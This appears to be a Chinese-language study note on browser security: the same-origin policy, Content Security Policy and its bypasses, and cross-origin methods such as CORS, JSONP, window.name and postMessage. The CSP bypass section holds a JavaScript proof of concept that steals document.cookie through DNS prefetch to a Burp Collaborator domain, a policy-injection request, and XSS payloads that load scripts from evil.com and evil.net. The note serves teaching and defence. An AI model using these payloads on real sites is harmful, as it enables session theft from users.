### 同源策略(SOP)

浏览器的[同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)[(Same-origin policy)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
规定：非同源的 客户端脚本(主要指JavaScript) 在没明确授权的情况下，不能读写非同源的资源。

* 非同源的资源(客户端安全威胁都是围绕这些资源进行)
  * HTTP header
  * 整个DOM树(Document Object Model)
  * 浏览器存储 如Cookies、Flash Cookies、localStorage...
* 同源策略的"例外" 其实同源策略本来就没对以下跨域资源嵌入做限制(可以通过CSP限制)
  * 说明 - 可以在当前域下进行"跨域资源嵌入" 来"展示"非当前域的资源 如CSS/JavaScript/图片
  * 原理 - 因为浏览器限制了非同域资源的权限 如非同域JavaScript不能真正 读 写 非同域的资源
  * 举例
    * `<link>`标签 通常使用href属性来指定css资源. (因为浏览器下载css文件的同时 不会停止对当前Document的处理) 如`<link href="common.css" rel="stylesheet"/>`
    * `<img>`标签 嵌入跨域图片. 通常使用src属性来指定资源 支持图片格式PNG,JPEG,GIF,BMP,SVG...
    * `<script>`标签 嵌入跨域脚本. 通常使用src属性来指定资源. 浏览器解析到该元素时 会暂停其他资源的下载和处理(直到该资源加载且执行结束后才会继续) 下载资源并应用到当前Document中. 如`<script src ="test.js"></script>`
    * `<iframe>`标签 通常使用src属性来指定资源 会下载资源并应用到当前Document中


#### 同源策略的意义

同源策略限制了非同源的客户端脚本的权限。

* 如果浏览器没有同源策略:
  * 例1 访问mail.com并登录mailA账户 的同时也访问了另一个网站E.com，网站E.com的JavaScript可以跨域读取mail.com的cookie，即获取到了mailA账户在mail.com的登录权限
  * 例2 访问Evil.com 该站点使用JavaScript获取mail.com的表单输入框的内容 从而捕获用户输入的数据 并很容易将数据发到Evil.com 盗取对应内容

#### 判断是否同源

* 两个url有相同的protocol host port则同源
  * protocol 协议必须完全相同 如`http`与`https`互为非同源
  * host 域名必须完全相同 如`www.a.com`与`sub.a.com`与`a.com` 三者互为非同源
  * port 端口必须完全相同 如`:80`与`:443`与`:8080` 三者互为非同源

-----

### 内容安全策略(CSP)

| 对比 | SOP 同源策略 | CSP 内容安全策略|
|:----:|---|---------|
| 简介 | web安全重要基础 | 增加安全性(CSP像是SOP的额外补充) web后端需设置后浏览器才会启用 |
| 作用 | 不同源的隔离(但不管跨域资源嵌入) | CSP用白名单限制"跨域资源"的源 能够减轻XSS漏洞的危害 报告XSS攻击 |
| 执行 | 由浏览器实现 | 由浏览器实现 |

* CSP - 内容安全策略(Content Security Policy)
    * CSP本质 - 浏览器端的白名单机制. 允许开发者通过`HTTP Response`为Web应用的客户端资源(JavaScript, CSS, images...)设置源白名单 使浏览器执行"开发者设置的CSP策略"
    * 原则 "除非明确允许 默认禁止"
    * CSP安全评估工具 - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)由Google开发
    * W3C标准[Content Security Policy Level 3](https://w3c.github.io/webappsec-csp/) 
    * [CSP Reference & Examples](https://content-security-policy.com/)

#### 配置CSP

* 启用CSP
  * 方法1 通过设置Response Header 格式为`Content-Security-Policy: <policy-directive>; <policy-directive>`
  * 方法2 通过设置Response Body `meta`标签 (不建议 浏览器对它的兼容性不如方法1) `<meta http-equiv="Content-Security-Policy" content="xxx">`


* CSP指令
  * 获取指令(Fetch directives)
    * child-src
    * connect-src
    * default-src
    * font-src
    * frame-src
    * img-src
    * manifest-src
    * media-src  `<audio>` `<video>` `<track>`
    * object-src `<object>` `<embed>` `<applet>`
    * ...


#### 严格的CSP可以减轻XSS 例1
  * 攻击场景 - 攻击者利用XSS漏洞将`<script src="evil.com/XSSattack1">`注入到a.com的html 可见script-src中的的源为evil.com
  * 同源策略 - 因为攻击脚本在script-src中 同源策略本来就不会限制script-src 可见同源策略不会防御XSS
  * CSP - 内容安全策略中如果有`script-src 'self'`（仅允许来自同源的脚本） 则使浏览器限制了a.com下的script-src的源 所以这个XSS利用方式 失败

#### 绕过CSP 方法1 - DNS prefetch

* 绕过原理 - CSP本来就不会完全限制DNS prefetch机制
  * CSP3有`prefetch-src`指令 限制link标签的src和href的源 
* 绕过过程
  * 攻击者构造输入 - 找到一处XSS漏洞 能够执行JavaScript脚本 但因严格的CSP 导致无法得到数据(cookie等)
  * 浏览器执行策略 - 浏览器执行严格的CSP策略`Content-Security-Policy: default-src 'self'`也无法限制DNS prefetch机制
  * 监听 - 攻击者在evil.com上记录DNS请求 即可得到数据(cookie等)
* 结论 - 不够严格的CSP 可被绕过实现数据泄露


实验：在 https://jsbin.com 中粘贴以下代码进行测试 结果是chrome浏览器中 `<link rel="prefetch" href="//evil.com>` 可以bypass CSP

```
<html>
<head>
  <!-- CSP -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'none';prefetch-src 'self';">
</head>
<body>
  <!-- DNS prefetching test -->
<link rel="dns-prefetch" href="//dns-prefetch-href.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net">
<link rel="dns-prefetch" src="//dns-prefetch-src.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net">
<link rel="prefetch" href="//prefetch-href.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net">
<link rel="prefetch" src="//prefetch-src.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net"> 
</body>
</html>
```

JavaScript PoC - 实测chrome下可利用XSS创建link标签 使用dns-prefetch机制发起DNS请求 绕过CSP获取数据
```
var willsend = document.cookie;//取全部(或部分)cookie 带分号空格的需要再处理
var evildomain = "bcrstw1nx4bxok82kk9mlz24yv4msb.burpcollaborator.net";
var body = document.getElementsByTagName('body')[0]; 
// injecting the link tag in the HTML body to prefetch the domain
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + "cookieis-" + willsend + "." + evildomain +"\">";
```


#### 绕过CSP 方法2 - web应用设计问题导致策略注入

绕过Paypal的CSP(chrome) [Bypassing CSP with policy injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)
* 绕过原理 - **前提**是该web应用的设计存在缺陷 即response的`Content-Security-Policy`这个header用户可控
* 绕过过程
  * 攻击者构造输入 - 使原本的CSP策略最末尾的`report-uri /report-csp`之后跟上了"攻击者注入的策略" `;script-src-elem *` (指定`<script>`元素的有效源为`*`) 此时CSP策略变为`Content-Security-Policy: script-src 'none'; report-uri /report-csp;script-src-elem *` 
  * 浏览器执行策略 - 浏览器依据规范[CSP: script-src-elem](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src-elem)中的优先级`script-src-elem` > `script-src` > `default-src` 即如果前者存在则使用前者的配置(后者配置无效) 所以这个案例中浏览器会执行`script-src-elem`的配置 不会使用策略中原本的`script-src`的配置 所以浏览器会允许`<script>`元素的有效源为`*`
  * XSSpayload `<script src="http://evil.net/xss.js"></script>` 执行成功


使用策略注入绕过CSP [在线靶场](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E) chrome下XSS成功触发


Request
```
GET /edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E HTTP/1.1
Host: portswigger-labs.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

Response
```
HTTP/1.1 200 OK
Date: Fri, 11 Oct 2019 07:01:13 GMT
Server: Apache/2.4.37 (Amazon) OpenSSL/1.0.2k-fips
X-XSS-Protection: 0
Content-Security-Policy: script-src 'none'; report-uri /test;script-src-elem *
Content-Length: 75
Connection: close
Content-Type: text/html; charset=UTF-8


<script src="http://subdomain1.portswigger-labs.net/xss/xss.js"></script>
```

#### 绕过CSP 方法3 - 策略不严格

例1 `Content-Security-Policy: default-src 'self'; script-src *;`

-----


### 如何允许跨源访问-方案

* 实现跨域的根本方法(W3C标准)
  * [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)跨域资源共享 - 允许任何http method的跨源AJAX请求. [CORS详情详解](http://www.ruanyifeng.com/blog/2016/04/cors.html)
* 实现跨域的其他办法
  * JSONP - 特点:只支持GET method 且无法双向传输数据
  * `window.postMessage(message，targetOrigin)` - 该HTML5方法可从当前window对象向其他的window对象发送消息 不论这两个窗口是否同源
  * Web Sockets
  * `location.hash`与iframe 跨域传值 - 数据容量有限制 数据类型有限制
  * `window.name`与iframe 跨域数据传输 - window对象的name参数可以在多标签内共享
  * flash

### 实例1 - CORS

Request:

A.com --req-> B.com

`Origin`表示该CORS Request是`Origin`中的网站(通常通过JavaScript)发起的。

从该请求可见 `http://A.com`的客户端脚本JavaScript 想要访问 目标 `http://B.com`的资源

从域名`http://A.com`(request header `Origin`) 发出request "试图"访问目标主机`Host: B.com`

```
GET /resources/public-data/ HTTP/1.1
Host: B.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://A.com/examples/access-control/simpleXSInvocation.html
Origin: http://A.com
```

Response:

A.com <-resp-- B.com

```
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 00:23:53 GMT
Server: Apache/2.0.61 
Access-Control-Allow-Origin: *
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: application/xml

[XML Data]
```

如上可见`B.com`响应中的`Access-Control-Allow-Origin: *` 代表`B.com`这个Domain的资源 可以接收并响应任何其他域（包括A.com）的request

如果`B.com`响应中是`Access-Control-Allow-Origin: http://A.com` 代表这个Domain的资源 只可以接收并响应 指定域`http://A.com`的request

只有 `http://B.com` 返回的HTTP响应头 `Access-Control-Allow-Origin` 明确指定允许 `http://A.com` 访问 `http://B.com` 的资源时，`http://A.com` 网站的客户端脚本JavaScript 才有权(通过AJAX技术 如XHR)对目标 `http://B.com` 上的资源进行读写操作。


* 使用CORS实现跨域 常见**安全风险**
  * B.com的`Access-Control-Allow-Origin: *`可以接收并响应任何其他域的request 存在风险 应该设置域名白名单

### 实例2 - JSON with Padding

* 根本原因 - JSONP可以"跨域"的根本原因是`<script>`标签能够("绕过"同源策略)请求其他域名的资源 如`<script src="http://www.B.com/1.js"></script>`
* 理解 - json是目的 JSONP是手段 Padding指的是callback函数
* 大致过程 - 域A.com下的JavaScript脚本 从域A.com发送HTTP请求到域B.com 得到B.com的响应 响应内容为json格式的数据(这样的数据符合JavaScript语法)  此时域A.com下的JavaScript脚本 把得到的具体数据作为实际参数 传递给域A.com下的回调函数 使用数据

首先在域A.com的前端 有JavaScript脚本如下:

```
//在body中动态添加一个 <script>标签
var script = document.createElement('script');
script.setAttribute("type","text/javascript");
script.src = 'http://B.com/info?callback=foo';//告诉外部的服务器B 请返回指定格式的JavaScript脚本  如foo({"token": "XXXX"}); 
//为什么不直接写成json数据`{"token": "XXXX"}`呢? 因为这是JSONP的原理要求的 因为JSONP在js文件中 需要符合js语法
document.body.appendChild(script);

//foo方法 是域A.com的一个方法. 当外部的服务器B 响应数据后 名为foo的函数 为接受数据的回调函数(callback)
function foo(data) {
console.log('Your token is: ' + data.token);
};
```

* JSONP详细步骤分析
  * 域A.com有一个`script`标签 `src`属性的值为域B.com下的`http://B.com/info?callback=foo` 即从域A发出GET请求到域B 其中参数callback的参数值为`foo` 三个字母组成的字符串(随后解释)
  * 非同域 域B.com的后端 得到了刚刚从域A.com发出的GET请求 也就得到了来自域A的字符串`foo` (foo 其实是域A.com前端JavaScript代码中定义的回调函数的函数名)
  * 非同域 域B.com的后端 设置响应内容为`foo({"token": "XXXX"});` 这样做是为了把具体数据返回给域A.com下的JavaScript
    * 注意域B.com的Response Header中Content-Type的值必须是JavaScript  即`text/javascript`或`application/javascript`
  * 域A.com的JavaScript脚本 得到响应内容 `foo({"token": "XXXX"});`
  * 域A.com的JavaScript脚本 把json数据 `{"token": "XXXX"}`作为实参 传入域A.com下的名为`foo`的函数(域A下早就定义了这个函数) 回调函数

就这样，通过JSONP的方式实现了跨域请求：域A.com 的客户端脚本就拿到了来自 域B.com的json格式的数据 `{"token": "XXXX"}`

* 使用JSONP实现跨域 常见**安全风险**
  * 如果B.com没有严格校验request header - 如没有严格校验`Referer` 导致攻击者在域C.com下构造JavaScript代码(参考正常业务 域A.com的前端代码) 能够获取B.com的响应内容 `foo({"token": "XXXX"});`

### 实例3 - JSON with Padding(jQuery实现)

jQuery可以使用匿名函数

```
$.ajax({
    url:"http://www.B.com/open.php?callback=?",
    dataType:"jsonp",
    success:function(data){
        console.log(data);
        //ToDo..
    }
});    
```

### 实例4 - 利用window.name与iframe实现跨域

跨域传输数据原理：window对象的name参数可以在多标签内共享

在域a.com的a.html中创建iframe标签并设置`iframe.src`为b.com(外域)的地址`iframe.src = 'http://b.com/b.html';`

在b.com(外域)的b.html中设置`window.name = 'xxx';`

此时在域a.com的a.html中,能获取到刚才在b.com(外域)设置的`window.name`


a.com的a.html的内容:
```
<script>
var iframe = document.createElement('iframe');//在域a.com下创建一个iframe元素

iframe.src="https://b.com/b.html"; //在域a.com下的/a.html 设置这个iframe元素的src属性的值为http://b.com/b.html

document.body.appendChild(iframe);


iframe.onload=function(){

// 在a.com下 得到来自外域b.com的数据

var data1 = iframe.contentWindow.name;
var data2 = iframe.contentWindow.location.href;

alert(data1);
alert(data2);

console.log("get data:",data1);
console.log("get data:",data2);

}
</script>
```

b.com的b.html的内容:
```
<script>
    // 需要传输的数据
    // 数据格式可以自定义:json 字符串...
    // 数据量：一般为2M，Firefox下约32M
    window.name = 'data_in_domain_b.com';
</script>
```

### 实例5 - window.postMessage

`window.postMessage(message，targetOrigin)` - 该HTML5方法可从当前window对象向其他的window对象发送消息 不论这两个窗口是否同源

`message` 为要发送的消息，类型只能为字符串
`targetOrigin` 用来限定接收消息的那个 window 对象所在的域 (可以使用通配符`*`不限定域)


a.com的a.html发送数据:
```
<iframe src="http://b.com/b.html" id="myIframe" onload="test()" style="display: none;">
<script>
    function test() {
        var iframe = document.getElementById('myIframe');
        var win = iframe.contentWindow; // 获取 http://b.com/b.html 页面的 window 对象
        win.postMessage('a.com a.html says: hello............', '*');   // 通过 postMessage 向 http://b.com/b.html 发送消息
    }
</script>
```


b.com的b.html接收数据:
接收消息的 window 对象，监听自身的 message 事件，消息内容储存在该事件对象的 data 属性中
`window.onmessage`
```
<script type="text/javascript">
    // 注册 message 事件用来接收消息
    window.onmessage = function(e) {
        e = e || event; // 获取事件对象
        console.log(e.data); // 通过 data 属性得到发送来的消息
    }
</script>
```

* 使用window.postMessage实现跨域 常见**安全风险**
  * XSS

### 实例6 - location.hash与iframe

html中的锚链接
```
<a href='#简介'>click</a>
```

如在本页面中跳转到"简介": 开发者模式输入 `location.hash="#简介"`

